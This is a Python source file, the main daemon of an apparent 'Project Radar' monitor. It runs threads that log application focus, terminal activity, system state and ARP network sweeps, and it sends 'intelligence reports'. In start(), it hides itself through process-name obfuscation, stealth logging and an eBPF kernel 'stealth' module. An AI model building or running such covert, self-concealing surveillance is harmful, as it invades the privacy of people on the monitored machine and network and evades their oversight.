import time
import logging
import signal
import sys
import threading
import schedule
from radar.config import settings
from radar.database.vault import Vault
from radar.monitors.app_monitor import AppMonitor
from radar.monitors.system_monitor import SystemMonitor
from radar.monitors.terminal_monitor import start_terminal_monitoring
from radar.fingerprint.scanner import ArpScanner
from radar.fingerprint.passive import PassiveSentinel
from radar.fingerprint.traffic import TrafficSentinel
from radar.reports.engine import ReportingEngine
from radar.database.cleanup import purge_old_data, vacuum_database
from radar.utils.stealth import obfuscate_process_name, set_low_priority, configure_stealth_logging
from radar.utils.ebpf_stealth import EbpfStealth

# Configure logging
logging.basicConfig(level=getattr(logging, settings.general.log_level.upper(), logging.WARNING))
logger = logging.getLogger("radar")

class RadarDaemon:
    """The central orchestrator for Project Radar."""
    
    def __init__(self):
        self.running = False
        self.vault = Vault()
        self.passive_sentinel = PassiveSentinel(self.vault)
        self.traffic_sentinel = TrafficSentinel(self.vault)
        self.app_monitor = AppMonitor(self.vault)
        self.system_monitor = SystemMonitor(self.vault)
        self.arp_scanner = ArpScanner(self.vault, self.passive_sentinel)
        # Link traffic sentinel to scanner for enrichment
        self.arp_scanner.traffic_sentinel = self.traffic_sentinel
        self.reporting_engine = ReportingEngine(self.vault)
        self.ebpf_stealth = EbpfStealth()
        self.threads = []
        self._last_tick = time.time()

    def _app_monitor_loop(self):
        """Background thread for app focus sampling."""
        interval = settings.monitoring.app_sample_interval
        while self.running:
            try:
                self.app_monitor.sample()
            except Exception as e:
                logger.error(f"App monitor crash: {e}")
            time.sleep(interval)

    def _system_monitor_loop(self):
        """Background thread for system health snapshots."""
        interval = settings.monitoring.system_sample_interval
        while self.running:
            try:
                self.system_monitor.snapshot()
            except Exception as e:
                logger.error(f"System monitor crash: {e}")
            time.sleep(interval)

    def _network_scan_loop(self):
        """Background thread for periodic ARP sweeps."""
        interval = settings.network.scan_interval
        jitter = settings.network.scan_jitter
        import random
        
        while self.running:
            try:
                self.arp_scanner.scan()
            except Exception as e:
                logger.error(f"Network scanner crash: {e}")
            
            # Wait with jitter
            wait_time = interval + random.randint(-jitter, jitter)
            time.sleep(max(10, wait_time))

    def _scheduler_loop(self):
        """Background thread for periodic tasks (Reports, Cleanup)."""
        # 1. Intelligence Reports (Every minute check)
        schedule.every().minute.do(self.reporting_engine.pulse)
        
        # 2. Daily Maintenance (Cleanup at 3 AM daily)
        schedule.every().day.at("03:00").do(self._run_maintenance)
        
        # 3. Pending Reports Retry (Every hour)
        schedule.every().hour.do(self.reporting_engine.process_pending_reports)
        
        while self.running:
            schedule.run_pending()
            time.sleep(10)

    def _run_maintenance(self):
        """Performs database cleanup and vacuuming."""
        logger.info("Running scheduled database maintenance...")
        try:
            purge_old_data()
            vacuum_database()
        except Exception as e:
            logger.error(f"Maintenance failed: {e}")

    def _check_sleep_wake(self):
        """Detects if the system has been asleep by checking for time jumps."""
        now = time.monotonic()
        # If the gap between ticks is > 120s, system likely woke from sleep
        if now - self._last_tick > 120: 
            logger.warning(f"Significant time jump detected ({int(now - self._last_tick)}s). System likely woke from sleep.")
            # Trigger immediate re-scans/updates
            threading.Thread(target=self.arp_scanner.scan, daemon=True).start()
        self._last_tick = now

    def start(self):
        """Starts all monitoring threads and the main loop."""
        print("Starting Radar Intelligence Daemon...")
        
        # 1. Apply Stealth
        configure_stealth_logging()
        obfuscate_process_name()
        set_low_priority()
        
        # Attempt to load Advanced Kernel Stealth (eBPF)
        self.ebpf_stealth.activate()
        
        self.running = True
        
        # 2. Start Passive Listeners & Terminal Watchdog
        self.passive_sentinel.start()
        self.traffic_sentinel.start()
        self.terminal_observer = start_terminal_monitoring(self.vault)
        
        # 3. Start Sampling Loops
        self.threads = [
            threading.Thread(target=self._app_monitor_loop, name="AppMonitor", daemon=True),
            threading.Thread(target=self._system_monitor_loop, name="SysMonitor", daemon=True),
            threading.Thread(target=self._network_scan_loop, name="NetMonitor", daemon=True),
            threading.Thread(target=self._scheduler_loop, name="Scheduler", daemon=True),
        ]
        
        for t in self.threads:
            t.start()
            logger.info(f"Started thread: {t.name}")

        # 4. Main Control Loop
        try:
            while self.running:
                self._check_sleep_wake()
                time.sleep(5)
        except (KeyboardInterrupt, SystemExit):
            self.stop()

    def stop(self):
        """Gracefully shuts down all components."""
        logger.info("Radar daemon shutting down...")
        self.running = False
        self.ebpf_stealth.deactivate()
        if hasattr(self, 'terminal_observer'):
            self.terminal_observer.stop()
            self.terminal_observer.join()
        logger.info("All monitors stopped. Vault secured.")
        sys.exit(0)

def main():
    daemon = RadarDaemon()
    
    # Handle OS signals
    def signal_handler(sig, frame):
        daemon.stop()
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    daemon.start()

if __name__ == "__main__":
    main()
